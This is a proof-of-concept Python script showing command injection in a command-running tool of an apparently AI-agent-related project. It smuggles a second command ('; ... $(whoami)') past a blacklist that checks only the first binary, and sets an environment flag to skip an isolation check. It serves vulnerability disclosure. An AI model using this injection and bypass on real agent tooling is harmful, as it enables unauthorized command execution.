"""
PoC for CWE-78: Command Injection in llmc_mcp.tools.cmd.run_cmd
"""

import os
from pathlib import Path
import sys

# Add repo root to path
sys.path.append(str(Path(__file__).parent.parent.parent))

from llmc_mcp.tools.cmd import run_cmd, validate_command


def test_exploit():
    print("[*] Testing Command Injection via shell metacharacters...")

    # Payload: Use an "innocent" command followed by a malicious one
    # Even if 'echo' is allowed, the '; id' will execute
    payload = "echo hello; echo VULNERABILITY_CONFIRMED: $(whoami)"

    # We can also prove that the validation logic is flawed
    # Let's pretend 'forbidden_binary' is blacklisted but 'echo' is not
    blacklist = ["forbidden_binary"]

    print(f"[*] Payload: {payload}")

    # BYPASS ISOLATION CHECK
    os.environ["LLMC_ISOLATED"] = "1"
    print("[*] Set LLMC_ISOLATED=1 to simulate container environment")

    # 1. Validation Bypass Proof
    import shlex

    parts = shlex.split(payload)
    binary = parts[0]
    print(f"[*] Validation sees binary as: '{binary}'")

    try:
        validate_command(parts, blacklist)
        print("[*] Validation PASSED (Logic Flaw confirmed)")
    except Exception as e:
        print(f"[-] Validation FAILED: {e}")
        return

    # 2. Execution Proof
    print("[*] Executing run_cmd...")
    result = run_cmd(command=payload, cwd=Path("."), blacklist=blacklist, timeout=5)

    print("-" * 40)
    print(result.stdout)
    print("-" * 40)

    if "VULNERABILITY_CONFIRMED" in result.stdout:
        print("[+] SUCCESS: Command Injection exploit worked!")
    else:
        print("[-] FAILED: Code execution not observed.")


if __name__ == "__main__":
    test_exploit()
